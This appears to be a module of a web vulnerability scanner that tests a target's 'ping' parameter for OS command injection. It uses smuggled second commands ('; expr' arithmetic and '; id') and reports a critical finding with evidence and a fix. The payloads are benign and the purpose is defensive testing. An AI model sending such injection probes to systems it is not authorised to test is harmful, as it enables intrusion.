// OS command injection probe (ported from server/redTeam/commandInjection.ts). Oracle-first: injects
// an arithmetic expression with random operands and reports only when the computed sum appears in
// the response. Falls back to the `id` output signature. Both payloads are benign.

import { randomInt } from 'node:crypto'
import { buildEvidence } from './evidence.mjs'
import { createScopedFetch, normalizeTarget } from './gate.mjs'

export const name = 'command-injection'
export const owaspCategory = 'A03:2021-Injection'

const ID_OUTPUT_SIGNATURE = /uid=\d+\([^)]*\)\s+gid=\d+\([^)]*\)/

function finding({ payload, attackUrl, res, matchIndex, quote, why, demonstration }) {
  return {
    module: name,
    owaspCategory,
    testName: 'Active OS Command Injection',
    payload,
    severity: 'critical',
    description: 'An injected shell command was evaluated by the backend, so arbitrary OS command execution is possible.',
    fix: 'Do not invoke OS commands with interpolated input. Use argument arrays with strict validation.',
    evidence: buildEvidence({
      method: 'oracle',
      attackUrl,
      status: res.status,
      contentType: res.contentType,
      body: res.body,
      matchIndex,
      quote,
      why,
      demonstration,
    }),
  }
}

export async function run(target, opts = {}, fetchFn = globalThis.fetch) {
  const base = normalizeTarget(target)
  const get = createScopedFetch({ fetchFn, gate: opts.gate, headers: opts.headers, timeoutMs: opts.timeoutMs })

  const a = 100000 + randomInt(899999)
  const b = 100000 + randomInt(899999)
  const sum = String(a + b)
  const oracleUrl = `${base}/?ping=127.0.0.1%3B+expr+${a}+%2B+${b}`
  const oracle = await get(oracleUrl)
  const sumIdx = oracle.body.indexOf(sum)
  if (sumIdx !== -1) {
    return finding({
      payload: `; expr ${a} + ${b}`,
      attackUrl: oracleUrl,
      res: oracle,
      matchIndex: sumIdx,
      quote: sum,
      why: `Injected "expr ${a} + ${b}"; the response contained ${sum}, which the literal payload never includes.`,
      demonstration: `Injected "expr ${a} + ${b}" into "ping"; the server returned the computed sum ${sum}.`,
    })
  }

  const idUrl = `${base}/?ping=127.0.0.1%3B+id`
  const idRes = await get(idUrl)
  const idMatch = ID_OUTPUT_SIGNATURE.exec(idRes.body)
  if (!idMatch) return null
  return finding({
    payload: '; id',
    attackUrl: idUrl,
    res: idRes,
    matchIndex: idMatch.index,
    quote: idMatch[0],
    why: 'This is the output of the Unix id command, which appears only if the backend executed the injected command.',
    demonstration: `Injected "; id" into "ping"; the server returned "${idMatch[0]}".`,
  })
}
